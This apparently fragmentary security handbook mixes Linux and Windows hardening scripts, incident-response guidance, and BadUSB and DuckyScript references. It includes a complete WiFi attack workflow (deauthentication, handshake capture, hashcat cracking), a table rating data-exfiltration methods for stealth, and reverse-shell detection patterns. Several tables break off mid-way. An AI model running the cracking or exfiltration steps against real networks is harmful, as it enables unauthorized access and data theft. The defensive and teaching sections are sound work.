    $status = if ($result.Compliant) { "PASS" } else { "FAIL" }
    Write-Host "[$status] $($result.Name)" -ForegroundColor $color
    if ($result.Action -ne "None") {
        Write-Host "       Action: $($result.Action)" -ForegroundColor Yellow
    }
}

$compliant = ($Results | Where-Object { $_.Compliant }).Count
$total = $Results.Count
Write-Host ""
Write-Host "Compliance: $compliant / $total settings" -ForegroundColor Cyan

if (-not $Apply) {
    Write-Host ""
    Write-Host "Run with -Apply to remediate non-compliant settings" -ForegroundColor Yellow
}
```

┌─────────────────────────────────────────────────────────────────────────────┐
│ LINUX SECURITY HARDENING - COMPREHENSIVE GUIDE                               │
├─────────────────────────────────────────────────────────────────────────────┤
│                                                                              │
│ CATEGORY 1: SSH HARDENING                                                    │
│ ──────────────────────────                                                   │
│                                                                              │
│ Edit /etc/ssh/sshd_config:                                                   │
│                                                                              │

│ PermitRootLogin no                                                           │
│                                                                              │
│ # Use key-based auth only                                                    │
│ PasswordAuthentication no                                                    │
│ PubkeyAuthentication yes                                                     │
│                                                                              │
│ # Disable empty passwords                                                    │
│ PermitEmptyPasswords no                                                      │
│                                                                              │
│ # Limit login attempts                                                       │
│ MaxAuthTries 3                                                               │
│                                                                              │
│ # Disable X11 forwarding                                                     │
│ X11Forwarding no                                                             │
│                                                                              │
│ # Use strong ciphers only                                                    │
│ Ciphers aes256-gcm@openssh.com,chacha20-poly1305@openssh.com                 │
│ MACs hmac-sha2-512-etm@openssh.com,hmac-sha2-256-etm@openssh.com             │
│                                                                              │
│                                                                              │
│ CATEGORY 2: FIREWALL (iptables/nftables)                                     │
│ ─────────────────────────────────────────                                    │
│                                                                              │
│ # Default deny all incoming                                                  │
│ iptables -P INPUT DROP                                                       │
│ iptables -P FORWARD DROP                                                     │
│ iptables -P OUTPUT ACCEPT                                                    │
│                                                                              │
│ # Allow established connections                                              │
│ iptables -A INPUT -m state --state ESTABLISHED,RELATED -j ACCEPT             │
│                                                                              │
│ # Allow loopback                                                             │
│ iptables -A INPUT -i lo -j ACCEPT                                            │
│                                                                              │
│ # Allow SSH (customize port)                                                 │
│ iptables -A INPUT -p tcp --dport 22 -j ACCEPT                                │
│                                                                              │
│ # Rate limit new connections (anti-DoS)                                      │
│ iptables -A INPUT -p tcp --dport 22 -m state --state NEW \                   │
│          -m recent --set                                                     │
│ iptables -A INPUT -p tcp --dport 22 -m state --state NEW \                   │
│          -m recent --update --seconds 60 --hitcount 4 -j DROP                │
│                                                                              │
│                                                                              │
│ CATEGORY 3: FILE PERMISSIONS                                                 │
│ ────────────────────────────                                                 │
│                                                                              │
│ # Secure /etc/passwd and /etc/shadow                                         │
│ chmod 644 /etc/passwd                                                        │
│ chmod 600 /etc/shadow                                                        │
│                                                                              │
│ # Secure SSH directory                                                       │
│ chmod 700 ~/.ssh                                                             │
│ chmod 600 ~/.ssh/authorized_keys                                             │
│                                                                              │
│ # Find world-writable files                                                  │
│ find / -type f -perm -002 -exec ls -la {} \; 2>/dev/null                     │
│                                                                              │
│ # Find SUID/SGID binaries                                                    │
│ find / -type f \( -perm -4000 -o -perm -2000 \) -exec ls -la {} \; 2>/dev/null│
│                                                                              │
│                                                                              │
│ CATEGORY 4: KERNEL HARDENING (sysctl)                                        │
│ ──────────────────────────────────────                                       │
│                                                                              │
│ Add to /etc/sysctl.conf:                                                     │

│ net.ipv4.ip_forward = 0                                                      │
│                                                                              │
│ # Disable source routing                                                     │
│ net.ipv4.conf.all.accept_source_route = 0                                    │
│                                                                              │
│ # Enable SYN cookies (SYN flood protection)                                  │
│ net.ipv4.tcp_syncookies = 1                                                  │
│                                                                              │
│ # Ignore ICMP redirects                                                      │
│ net.ipv4.conf.all.accept_redirects = 0                                       │
│                                                                              │

│ net.ipv4.icmp_echo_ignore_broadcasts = 1                                     │
│                                                                              │
│ # Restrict core dumps                                                        │
│ fs.suid_dumpable = 0                                                         │
│                                                                              │
│ # Enable ASLR                                                                │
│ kernel.randomize_va_space = 2                                                │
│                                                                              │
│ # Restrict kernel pointer leak                                               │
│ kernel.kptr_restrict = 2                                                     │
│                                                                              │
│ Apply: sysctl -p                                                             │

### Bash: Linux Hardening Script

```bash
#!/bin/bash
# =====================================================
# LINUX SECURITY HARDENING SCRIPT
# Purpose: Apply security baseline configurations
# Run: As root (sudo)
# WARNING: Test in lab environment first!
# =====================================================

# Colors
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
NC='\033[0m'

APPLY=false
if [ "$1" == "--apply" ]; then
    APPLY=true
fi

echo "==========================================="
echo "  Linux Security Hardening Check"
echo "==========================================="
echo ""

PASS=0
FAIL=0

check_setting() {
    local name=$1
    local test_cmd=$2
    local fix_cmd=$3

    if eval "$test_cmd" > /dev/null 2>&1; then
        echo -e "[${GREEN}PASS${NC}] $name"
        ((PASS++))
    else
        echo -e "[${RED}FAIL${NC}] $name"
        ((FAIL++))
        if [ "$APPLY" == true ] && [ -n "$fix_cmd" ]; then
            echo -e "       ${YELLOW}Applying fix...${NC}"
            eval "$fix_cmd"
        fi
    fi
}

# === SSH HARDENING ===
echo "=== SSH Configuration ==="

check_setting "SSH: Root login disabled" \
    "grep -q '^PermitRootLogin no' /etc/ssh/sshd_config" \
    "sed -i 's/^#*PermitRootLogin.*/PermitRootLogin no/' /etc/ssh/sshd_config"

check_setting "SSH: Password auth disabled" \
    "grep -q '^PasswordAuthentication no' /etc/ssh/sshd_config" \
    ""  # Don't auto-fix this - could lock out users

check_setting "SSH: X11 forwarding disabled" \
    "grep -q '^X11Forwarding no' /etc/ssh/sshd_config" \
    "sed -i 's/^#*X11Forwarding.*/X11Forwarding no/' /etc/ssh/sshd_config"

# === KERNEL HARDENING ===
echo ""
echo "=== Kernel Hardening ==="

check_setting "IP forwarding disabled" \
    "[ $(cat /proc/sys/net/ipv4/ip_forward) -eq 0 ]" \
    "sysctl -w net.ipv4.ip_forward=0"

check_setting "SYN cookies enabled" \
    "[ $(cat /proc/sys/net/ipv4/tcp_syncookies) -eq 1 ]" \
    "sysctl -w net.ipv4.tcp_syncookies=1"

check_setting "ASLR enabled" \
    "[ $(cat /proc/sys/kernel/randomize_va_space) -eq 2 ]" \
    "sysctl -w kernel.randomize_va_space=2"

check_setting "Core dumps restricted" \
    "[ $(cat /proc/sys/fs/suid_dumpable) -eq 0 ]" \
    "sysctl -w fs.suid_dumpable=0"

# === FILE PERMISSIONS ===
echo ""
echo "=== File Permissions ==="

check_setting "/etc/passwd permissions (644)" \
    "[ $(stat -c '%a' /etc/passwd) == '644' ]" \
    "chmod 644 /etc/passwd"

check_setting "/etc/shadow permissions (600 or 640)" \
    "[ $(stat -c '%a' /etc/shadow) == '600' ] || [ $(stat -c '%a' /etc/shadow) == '640' ]" \
    "chmod 600 /etc/shadow"

check_setting "/etc/gshadow permissions (600 or 640)" \
    "[ -f /etc/gshadow ] && ([ $(stat -c '%a' /etc/gshadow) == '600' ] || [ $(stat -c '%a' /etc/gshadow) == '640' ])" \
    "[ -f /etc/gshadow ] && chmod 600 /etc/gshadow"

# === SERVICES ===
echo ""
echo "=== Services ==="

check_setting "Auditd running" \
    "systemctl is-active auditd > /dev/null 2>&1" \
    "systemctl enable auditd && systemctl start auditd"

check_setting "Firewall active (iptables or nftables)" \
    "iptables -L > /dev/null 2>&1 || nft list ruleset > /dev/null 2>&1" \
    ""

# === DANGEROUS SETTINGS ===
echo ""
echo "=== Dangerous Settings Check ==="

check_setting "No world-writable files in /etc" \
    "[ $(find /etc -type f -perm -002 2>/dev/null | wc -l) -eq 0 ]" \
    ""

check_setting "No .rhosts files" \
    "[ $(find /home -name '.rhosts' 2>/dev/null | wc -l) -eq 0 ]" \
    "find /home -name '.rhosts' -delete 2>/dev/null"

# === RESULTS ===
echo ""
echo "==========================================="
echo "  Results: $PASS passed, $FAIL failed"
echo "==========================================="

if [ "$APPLY" != true ]; then
    echo ""
    echo "Run with --apply to fix failed checks"
fi
```

# INCIDENT RESPONSE PROCEDURES - COMPREHENSIVE GUIDE

## Understanding Incident Response

```
┌─────────────────────────────────────────────────────────────────────────────┐
│ INCIDENT RESPONSE FUNDAMENTALS                                               │
├─────────────────────────────────────────────────────────────────────────────┤
│                                                                              │
│ WHAT IS INCIDENT RESPONSE?                                                   │
│ ──────────────────────────                                                   │
│ Incident Response (IR) is the organized approach to addressing and          │
│ managing the aftermath of a security breach or cyberattack. The goal is     │
│ to handle the situation in a way that limits damage and reduces recovery    │
│ time and costs.                                                              │
│                                                                              │
│ THE INCIDENT RESPONSE LIFECYCLE (NIST):                                      │
│                                                                              │
│    ┌────────────────────────────────────────────────────────────────────┐   │
│    │                                                                    │   │
│    │   ┌─────────────┐    ┌─────────────┐    ┌─────────────┐           │   │
│    │   │ PREPARATION │───▶│  DETECTION  │───▶│ CONTAINMENT │           │   │
│    │   │             │    │  & ANALYSIS │    │             │           │   │
│    │   └─────────────┘    └─────────────┘    └──────┬──────┘           │   │
│    │         ▲                                      │                   │   │
│    │         │                                      ▼                   │   │
│    │   ┌─────┴───────┐    ┌─────────────┐    ┌─────────────┐           │   │
│    │   │  POST-      │◀───│  RECOVERY   │◀───│ ERADICATION │           │   │
│    │   │  INCIDENT   │    │             │    │             │           │   │
│    │   └─────────────┘    └─────────────┘    └─────────────┘           │   │
│    │                                                                    │   │
│    └────────────────────────────────────────────────────────────────────┘   │
│                                                                              │
│ INCIDENT SEVERITY LEVELS:                                                    │
│ ──────────────────────────                                                   │
│ ┌─────────────────────────────────────────────────────────────────────────┐ │
│ │ LEVEL │ NAME      │ DESCRIPTION                    │ RESPONSE TIME     │ │
│ ├───────┼───────────┼────────────────────────────────┼───────────────────┤ │
│ │ SEV 1 │ CRITICAL  │ Active breach, data exfil,     │ Immediate         │ │
│ │       │           │ ransomware, business stopped   │ (< 15 minutes)    │ │
│ ├───────┼───────────┼────────────────────────────────┼───────────────────┤ │
│ │ SEV 2 │ HIGH      │ Confirmed intrusion, malware   │ < 1 hour          │ │
│ │       │           │ active, credential compromise  │                   │ │
│ ├───────┼───────────┼────────────────────────────────┼───────────────────┤ │
│ │ SEV 3 │ MEDIUM    │ Suspicious activity, policy    │ < 4 hours         │ │
│ │       │           │ violations, potential threat   │                   │ │
│ ├───────┼───────────┼────────────────────────────────┼───────────────────┤ │
│ │ SEV 4 │ LOW       │ Security events, policy issues │ < 24 hours        │ │
│ │       │           │ minor investigations           │                   │ │
│ └───────┴───────────┴────────────────────────────────┴───────────────────┘ │
│                                                                              │
│ BADUSB INCIDENT CLASSIFICATION:                                              │
│ ─────────────────────────────────                                            │
│ BadUSB attacks (Flipper Zero, Rubber Ducky) are typically:                   │
│ • SEV 1 if: Active C2 connection, data exfiltration in progress              │
│ • SEV 2 if: Payload executed, persistence established                        │
│ • SEV 3 if: Device detected before payload execution                         │
│                                                                              │
│ IR TEAM STRUCTURE:                                                           │
│ ──────────────────                                                           │
│ • IR Team Leader (Incident Commander) - Overall coordination                 │
│ • Triage Analyst - Initial assessment and severity classification            │
│ • Forensics Analyst - Evidence collection and root cause analysis            │
│ • Communications Lead - Stakeholder updates and documentation                │
│                                                                              │
│ KEY IR PHASES:                                                               │
│ ───────────────                                                              │
│ 1. PREPARATION - Plans, tools, training before incidents                     │
│ 2. DETECTION & ANALYSIS - Identify and understand the threat                 │
│ 3. CONTAINMENT - Stop the spread, preserve evidence                          │
│ 4. ERADICATION - Remove the threat completely                                │
│ 5. RECOVERY - Restore systems safely                                         │
│ 6. LESSONS LEARNED - Improve for next time                                   │
│                                                                              │
│ EVIDENCE VOLATILITY ORDER (Collect in this order):                           │
│ ───────────────────────────────────────────────────                          │
│ 1. Memory (RAM) - Most volatile                                              │
│ 2. Network connections                                                       │
│ 3. Running processes                                                         │
│ 4. Open files                                                                │
│ 5. Filesystem - Least volatile                                               │
│                                                                              │
│ CONTAINMENT QUICK ACTIONS:                                                   │
│ ──────────────────────────                                                   │
│ • Disconnect from network (preserve evidence first)                          │
│ • Block malicious IPs/domains at firewall                                    │
│ • Disable compromised accounts                                               │
│ • Take memory dump before shutdown                                           │
│                                                                              │
└─────────────────────────────────────────────────────────────────────────────┘
```

│ TECHNICAL (INDICATORS) - IOC level, detection rules                         │
│                                                                              │
│ INDICATOR TYPES (IOCs):                                                      │

│ • File Hash (MD5/SHA256) - Short lifespan, high value                        │
│ • IP Address - Short-medium lifespan, medium value                           │
│ • Domain - Medium lifespan, medium value                                     │
│ • URL - Short lifespan, medium value                                         │
│ • TTPs (MITRE ATT&CK) - Long lifespan, very high value                       │
│                                                                              │
│ FREE THREAT INTELLIGENCE SOURCES:                                            │
│ ──────────────────────────────────                                           │
│ • VirusTotal - File/URL analysis, IOC lookups                                │
│ • AlienVault OTX - Community threat intelligence                             │
│ • Abuse.ch - Malware/botnet tracking                                         │
│ • URLhaus - Malicious URL database                                           │

│ YARA RULES:                                                                  │
│ ────────────                                                                 │

│                                                                              │

│ • Base64 encoded commands                                                    │
│ • Registry persistence modifications                                         │
│ • Reverse shell patterns (TCPClient, GetStream)                              │
│                                                                              │

## Exfiltration Comparison

```
┌─────────────────────────────────────────────────────────────────────────────┐
│ DATA EXFILTRATION METHODS COMPARISON                                         │

│ ├─────────────────┼──────────┼──────────┼──────────┼─────────────────────┤  │
│ │ HTTP/HTTPS POST │ Medium   │ High     │ Fast     │ Blends with web     │  │
│ │ DNS Tunneling   │ High     │ Low      │ Slow     │ Bypasses many FWs   │  │
│ │ ICMP Tunneling  │ High     │ Low      │ Slow     │ Often not logged    │  │
│ │ USB Storage     │ Low      │ Very High│ Fast     │ Requires STORAGE    │  │
│ │ Cloud Storage   │ Medium   │ High     │ Fast     │ OneDrive, Dropbox   │  │
│ │ Email (SMTP)    │ Medium   │ Medium   │ Medium   │ May trigger alerts  │  │
│ │ Keystroke Refl. │ Very High│ Low      │ Slow     │ No network needed   │  │

│ │ ENTER                                                              │      │

# WIFI PASSWORD CRACKING WORKFLOW

## From Capture to Crack

```
┌─────────────────────────────────────────────────────────────────────────────┐
│ COMPLETE WIFI CRACKING WORKFLOW                                              │
├─────────────────────────────────────────────────────────────────────────────┤
│                                                                              │
│ STEP 1: CAPTURE HANDSHAKE (WiFi Pineapple Pager)                            │
│ ┌────────────────────────────────────────────────────────────────────┐      │
│ │ #!/bin/bash                                                        │      │
│ │ # Pager payload to capture WPA handshake                          │      │
│ │                                                                    │      │
│ │ NOTIFY "Starting handshake capture..."                            │      │
│ │ LED yellow                                                         │      │
│ │                                                                    │      │
│ │ # Put interface in monitor mode                                   │      │
│ │ airmon-ng start wlan1                                              │      │
│ │                                                                    │      │
│ │ # Capture on target channel, save to file                        │      │
│ │ timeout 120 airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF \         │      │
│ │   -w /root/loot/handshake wlan1mon &                              │      │
│ │                                                                    │      │
│ │ # Deauth to force reconnection                                   │      │
│ │ sleep 10                                                           │      │
│ │ aireplay-ng --deauth 5 -a AA:BB:CC:DD:EE:FF wlan1mon             │      │
│ │                                                                    │      │
│ │ wait                                                               │      │
│ │ airmon-ng stop wlan1mon                                           │      │
│ │                                                                    │      │
│ │ NOTIFY "Capture complete!"                                        │      │
│ │ LED green                                                          │      │
│ └────────────────────────────────────────────────────────────────────┘      │
│                                                                              │
│ STEP 2: VERIFY HANDSHAKE                                                     │
│ ┌────────────────────────────────────────────────────────────────────┐      │
│ │ # Check if handshake was captured                                 │      │
│ │ aircrack-ng /root/loot/handshake-01.cap                          │      │
│ │                                                                    │      │
│ │ # Output should show:                                             │      │
│ │ # "1 handshake" next to the target network                       │      │
│ └────────────────────────────────────────────────────────────────────┘      │
│                                                                              │
│ STEP 3: TRANSFER TO CRACKING RIG                                             │
│ ┌────────────────────────────────────────────────────────────────────┐      │
│ │ # SCP from Pager to your workstation                             │      │
│ │ scp root@pager:/root/loot/handshake-01.cap ~/cracking/           │      │
│ └────────────────────────────────────────────────────────────────────┘      │
│                                                                              │
│ STEP 4: CONVERT FOR HASHCAT                                                  │
│ ┌────────────────────────────────────────────────────────────────────┐      │
│ │ # Convert .cap to .hc22000 format                                 │      │
│ │ hcxpcapngtool -o handshake.hc22000 handshake-01.cap              │      │
│ │                                                                    │      │
│ │ # Or use online converter: hashcat.net/cap2hashcat               │      │
│ └────────────────────────────────────────────────────────────────────┘      │
│                                                                              │
│ STEP 5: CRACK WITH HASHCAT                                                   │
│ ┌────────────────────────────────────────────────────────────────────┐      │
│ │ # Dictionary attack                                               │      │
│ │ hashcat -m 22000 handshake.hc22000 rockyou.txt                   │      │
│ │                                                                    │      │
│ │ # With rules for variations                                       │      │
│ │ hashcat -m 22000 handshake.hc22000 rockyou.txt -r best64.rule   │      │
│ │                                                                    │      │
│ │ # Brute force (8 characters)                                     │      │
│ │ hashcat -m 22000 handshake.hc22000 -a 3 ?a?a?a?a?a?a?a?a         │      │
│ │                                                                    │      │
│ │ # SPEED: Modern GPU can try billions of passwords per second     │      │
│ └────────────────────────────────────────────────────────────────────┘      │
│                                                                              │
│ ALTERNATIVE: AIRCRACK-NG (CPU-based, slower)                                │
│ ┌────────────────────────────────────────────────────────────────────┐      │
│ │ aircrack-ng -w rockyou.txt handshake-01.cap                      │      │
│ └────────────────────────────────────────────────────────────────────┘      │
│                                                                              │
│ RECOMMENDED WORDLISTS:                                                       │
│ • rockyou.txt (14 million passwords)                                        │
│ • SecLists (various targeted lists)                                         │
│ • hashesorg2019 (large, comprehensive)                                      │
│ • Custom lists based on target (company name + years, etc.)                │
│                                                                              │
└─────────────────────────────────────────────────────────────────────────────┘

# LEGAL AND ETHICAL GUIDELINES

## Authorization and Documentation

```
┌─────────────────────────────────────────────────────────────────────────────┐
│ LEGAL AND ETHICAL REQUIREMENTS                                               │
├─────────────────────────────────────────────────────────────────────────────┤

│ │                                                                    │      │

│ ┌────────────────────────────────────────────────────────────────────┐      │
│ │                                                                    │      │
│ │ DURING TESTING:                                                    │      │
│ │ • Log all activities with timestamps                              │      │
│ │ • Document systems accessed                                       │      │
│ │ • Record data viewed/extracted                                    │      │
│ │ • Note any unexpected impacts                                     │      │
│ │                                                                    │      │
│ │ AFTER TESTING:                                                     │      │
│ │ • Provide detailed findings report                                │      │
│ │ • Include evidence (screenshots, logs)                            │      │
│ │ • Rate risks (Critical, High, Medium, Low)                       │      │
│ │ • Recommend remediation steps                                     │      │

│                                                                              │

│                                                                              │
│ DuckyScript Scripting language for USB Rubber Ducky and similar devices    │
│                                                                              │

│                                                                              │

## DuckyScript Command Cheat Sheet

```
┌─────────────────────────────────────────────────────────────────────────────┐
│ DUCKYSCRIPT QUICK REFERENCE                                                  │

│                                                                              │

│ │ STRINGLN text        │ Type "text" then press Enter                │     │
│ │ ENTER                │ Press Enter key                             │     │

│ │ BACKSPACE            │ Press Backspace                             │     │
│ │ DELETE               │ Press Delete                                │     │
│ │ ESC / ESCAPE         │ Press Escape                                │     │
│ └─────────────────────────────────────────────────────────────────────┘     │
│                                                                              │
│ MODIFIER KEYS:                                                               │
│ ┌─────────────────────────────────────────────────────────────────────┐     │
│ │ GUI / WINDOWS        │ Windows/Command key                         │     │
│ │ CTRL                 │ Control key                                 │     │
│ │ ALT                  │ Alt key                                     │     │
│ │ SHIFT                │ Shift key                                   │     │
│ │ GUI r                │ Windows+R (Run dialog)                      │     │

│ │ CTRL SHIFT ESC       │ Task Manager                                │     │
│ └─────────────────────────────────────────────────────────────────────┘     │
│                                                                              │

│ ┌─────────────────────────────────────────────────────────────────────┐     │

│ │ ALTSTRING text       │ Type using ALT codes (any layout)           │     │
│ │ SYSRQ                │ System Request key                          │     │
│ │ PRINTSCREEN          │ Screenshot key                              │     │
│ └─────────────────────────────────────────────────────────────────────┘     │
│                                                                              │
│ COMMON PAYLOADS:                                                             │
│ ┌─────────────────────────────────────────────────────────────────────┐     │

│ │ After GUI r:    500ms       │ After CMD:        800ms             │     │
│ │ After STRING:   100-200ms   │ After ENTER:      500-1000ms        │     │
│ └─────────────────────────────────────────────────────────────────────┘     │
│                                                                              │
└─────────────────────────────────────────────────────────────────────────────┘
